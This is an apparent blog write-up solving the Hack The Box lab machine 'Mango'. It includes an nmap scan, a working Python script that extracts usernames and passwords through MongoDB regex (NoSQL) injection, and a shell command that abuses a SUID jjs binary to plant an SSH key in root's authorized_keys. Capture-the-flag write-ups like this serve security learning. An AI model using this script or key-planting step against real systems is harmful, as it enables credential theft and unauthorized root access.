---
title: "Mango - HackTheBox"
date: "2020-04-18"
tags: [nosql injection, suid]
---

![](/images/hackthebox/mango/info.png)
Mango is a medium difficulty machine from Hack The Box, which is actually pretty
straight forwards as it involves a noSQL injection and a simple privilege
escalation using a SUID binary.

## Information gathering
Let's run a port scan:
```
$ nmap -A -T4 10.10.10.162
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-27 12:26 EDT
Nmap scan report for 10.10.10.162
Host is up (0.046s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's visit the two web servers, here's the one on port 80, altough as we can
see from the port scan, it will return 403:
![](/images/hackthebox/mango/web-80.png)

And here's the one on port 443:
![](/images/hackthebox/mango/web-443.png)

From the port scan it seems that there's a subdomain, so let's add
`staging-order.mango.htb` to `/etc/hosts` in order to be able to visit it:
![](/images/hackthebox/mango/mango.png)

It's a simple login form, and trying some default credentials yields us
nothing. This took me a lot of time and so much trial and error, but in the end
I found out that there was a NoSQL injection in mongoDB, hence the name mango.

Basically we can use regexes to enumerate usernames and passwords by making a
request like `username[$regex]=^a.*`, so that if the regex matches a database
record, a `302` response will happen, here's an example request:
![](/images/hackthebox/mango/nosql-injection-request.png)

And the response we get when it matches a record:
![](/images/hackthebox/mango/nosql-injection-response.png)

## Getting some credentials
We can use python to write a simple script that automates this, enumerating all
usernames and passwords:
```python
#!/usr/bin/env python3
import requests
import string
import os

url = "http://staging-order.mango.htb"

headers = {
    "Host": "staging-order.mango.htb",
    "Origin": "http://staging-order.mango.htb",
    "Referer": "http://staging-order.mango.htb/",
}


def clear_screen():
    rows, columns = os.popen('stty size', 'r').read().split()
    print(' '*int(columns), end='\r')


def search_users(starting_user):
    end = True
    for i in string.ascii_letters:
        username = starting_user + i
        clear_screen()
        print(f'[*] Enumerating username: {username}', end='\r')
        post_data = {
            'password[$regex]': '.*',
            'username[$regex]': '^' + username + '.*',
            'login': 'login'
        }
        r = requests.post(url, headers=headers, data=post_data,
                          allow_redirects=False)

        # If we get a redirect let's continue to search, otherwise it means
        # that no other new characters were found
        if r.status_code == 302:
            end = False
            if search_users(username):
                clear_screen()
                print(f'[+] Found username {username}')
                usernames.append(username)
    return end


def search_password(username, starting_password):
    symbols = '!"#%&\'(),-/:;<=>@[]_`{}~ '
    for char in string.ascii_letters + string.digits + symbols:
        password = starting_password + char
        clear_screen()
        print(f'[*] Enumerating {username} password: {password}', end='\r')
        post_data = {
            'password[$regex]': '^' + password + '.*',
            'username': username,
            'login': 'login'
        }
        r = requests.post(url, headers=headers, data=post_data,
                          allow_redirects=False)

        if r.status_code == 302:
            return search_password(username, password)
    clear_screen()
    print(f'[+] Found {username} password: {password}')
    return starting_password


usernames = []
search_users('')
for username in usernames:
    search_password(username, '')
```

Here is it running at 20x speed:
{{< youtube U0QZDvm-FvE >}}


Only mango is allowed to login with ssh, so after doing it, let's change user
with `su admin` and get the flag:
```
$ wc -c user.txt
33 user.txt
```

## Privilege escalation

Running any enumeration script like
[LinEnum](https://github.com/rebootuser/LinEnum) or
[linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
will show us that there's an unusual binary with the SUID bit enabled in
`/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs` owned by root:
```
$ ls -la /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

[GTFOBins](https://gtfobins.github.io/) is a sacred place when it comes to SUID.
The way I did it is to add a ssh key to root by executing this shell script:
```bash
echo 'var FileWriter = Java.type("java.io.FileWriter");
var fw=new FileWriter("/root/.ssh/authorized_keys");
fw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFcBo9MugZlLYc5yd0d8yUE3vIf7eVYeNqoOuEL1X6XNV7bBFuNGOrKgayZJxr/ZAF+8YIAgvyCzfrUWIGLDPBmEonXQCI1rPE625wq85hUwGrZLAcBVLCBluXfnUUl5wru5k9wZ4OgHLQN5QhI1aTlFczp/Es8bIUbDJ+hPYaHzQ4ydZDs5aHQ/2YdKBl0TNG7yslsuaxAbc/mDzB+kS20uTdM8CxTYRAYmb2HMGToXeUt9wIeU5mJAqdVBFx7A5v6g0u22AGrBtRbRQdVL9REquljOJre8JK7Am0KNzO4v0uSCQK1LBOeb8cwqnTuU8BokaE6zbhnvZdxzhHDcnm0l98IfmnkqkdJXaTruL89V4UFQugLb38/aPWkx0J3SiB0F3Xl1uZDAJUAG6SmJeEw+wzky/r5g+aB91iCDwpcNY7LKMtuQU/CrTa9T+Za1pC/r7HyxPKwLD2rIpw9qbWHGXJEBj54E2EjGO3TUXJlYYzPXYekn3uermxj3CNYXs= vagrant@kali");
fw.close();' | jjs
```

And here we go:
```
root@mango:~# wc -c root.txt
33 root.txt
```

Thanks for reading!
